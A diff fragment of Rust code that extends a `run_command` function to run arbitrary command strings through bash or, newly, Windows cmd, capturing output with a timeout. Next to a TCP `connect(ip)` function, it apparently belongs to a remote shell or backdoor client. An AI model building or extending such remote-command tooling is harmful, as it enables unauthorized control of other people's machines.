@@ -43,31 +43,34 @@ fn connect(ip: &str) -> TcpStream {
 }
 
 fn run_command(cmd: &str) -> String {
-    let mut child = match Command::new("/bin/bash").arg("-c").arg(cmd).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn(){
-        Ok(out)=>{
-            out
-        }
-        Err(e)=>{
-            return format!("");
-        }
+    let child = if !cfg!(target_os ="windows"){
+        let mut child = match Command::new("/bin/bash").arg("-c").arg(cmd).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn(){
+            Ok(out)=>{
+                out
+            }
+            Err(e)=>{
+                return format!("");
+            }
+        };
+        let one_sec = Duration::from_secs(3);
+        let status_code = match child.wait_timeout(one_sec).unwrap() {
+            Some(status) => status.code(),
+            None => {
+                match child.kill(){
+                    Ok(_)=>{
+                        "Process killed."
+                    }
+                    Err(_)=>{
+                        "Process could not be killed."
+                    }
+                };
+                child.wait().unwrap().code()
+            }
+        };
+        child
+    } else{
+        Command::new("cmd").arg("/c").arg(cmd).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().unwrap()
     };
-
-    let one_sec = Duration::from_secs(3);
-    let status_code = match child.wait_timeout(one_sec).unwrap() {
-        Some(status) => status.code(),
-        None => {
-            match child.kill(){
-                Ok(_)=>{
-                    "Process killed."
-                }
-                Err(_)=>{
-                    "Process could not be killed."
-                }
-            };
-            child.wait().unwrap().code()
-        }
-    };
-
     let mut stdout_str = String::new();
     let mut stdout = child.stdout.unwrap();
     let mut stderr_str = String::new();
